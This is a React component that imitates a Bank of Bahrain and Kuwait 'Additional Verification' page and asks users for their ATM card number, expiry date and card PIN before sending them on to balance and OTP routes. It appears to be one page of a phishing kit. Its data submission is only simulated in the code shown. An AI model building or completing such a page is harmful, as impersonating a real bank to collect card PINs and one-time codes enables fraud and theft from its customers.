// CardDetails.jsx
import React, { useState } from "react";
import { useNavigate } from "react-router-dom";

export default function CardDetails() {
  const navigate = useNavigate();

  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [pin, setPin] = useState("");
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();

    if (cardNumber.length !== 16) return alert("Please enter a valid 16-digit card number");
    if (!expiry.match(/(0[1-9]|1[0-2])\/\d{2}/)) return alert("Please enter a valid expiry date (MM/YY)");
    if (pin.length !== 4) return alert("Please enter a valid 4-digit PIN");

    setLoading(true);

    // Simulate sending data
    setTimeout(() => {
      setLoading(false);
      navigate("/balance"); // Replace with your OTP page route
    }, 1500);
  };

  // Auto-format expiry date as MM/YY
  const handleExpiryChange = (e) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 2) {
      value = value.substring(0, 2) + "/" + value.substring(2, 4);
    }
    setExpiry(value);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#4A90E2] via-[#2E5BBA] to-[#1E3A8A] flex flex-col items-center px-6 py-12 text-white">
      
      {/* Logo */}
      <div className="w-full flex justify-end mb-16">
        <div className="flex flex-col items-center text-center">
          <div className="relative text-3xl font-bold tracking-wide mb-1">
            BBK
            <span className="absolute -top-1 -right-4 text-xl">✱</span>
          </div>
          <div className="text-xs opacity-90 rtl">بنك البحرين والكويت</div>
        </div>
      </div>

      {/* Heading */}
      <div className="text-center mb-10">
        <h1 className="text-2xl font-light mb-2">Additional Verification</h1>
        <p className="text-sm opacity-80">
          For your security, please provide the following information to complete the verification process
        </p>
      </div>

      {/* Form */}
      <form onSubmit={handleSubmit} className="flex flex-col w-full max-w-md gap-6">

        <input
          type="tel"
          placeholder="Enter your 16-digit ATM card number *"
          value={cardNumber}
          onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, ""))}
          maxLength={16}
          pattern="\d{16}"
          className="w-full bg-transparent border-b border-white/50 py-4 text-white placeholder-white/70 focus:border-white outline-none transition"
          required
        />

        <input
          type="tel"
          placeholder="Expiry date (MM/YY) *"
          value={expiry}
          onChange={handleExpiryChange}
          maxLength={5}
          pattern="(0[1-9]|1[0-2])\/\d{2}"
          className="w-full  border-b border-white/50 py-4 text-white placeholder-white/70 focus:border-white outline-none transition"
          required
        />

        <input
          type="password"
          placeholder="Enter your card PIN *"
          value={pin}
          onChange={(e) => setPin(e.target.value.replace(/\D/g, ""))}
          maxLength={4}
          pattern="\d{4}"
          className="w-full bg-transparent border-b border-white/50 py-4  outline-none transition"
          required
        />

        <button
          type="submit"
          disabled={loading}
          className={`w-full py-4 rounded-full text-lg font-medium transition ${
            loading ? "bg-white/30 cursor-not-allowed" : "bg-white/20 hover:bg-white/30"
          }`}
        >
          {loading ? "Processing..." : "Continue"}
        </button>

        <div className="text-center mt-6">
          <button
            type="button"
            onClick={() => navigate("/otp")}
            className="text-sm text-white/90 hover:text-white underline"
          >
            ← Back
          </button>
        </div>
      </form>
    </div>
  );
}
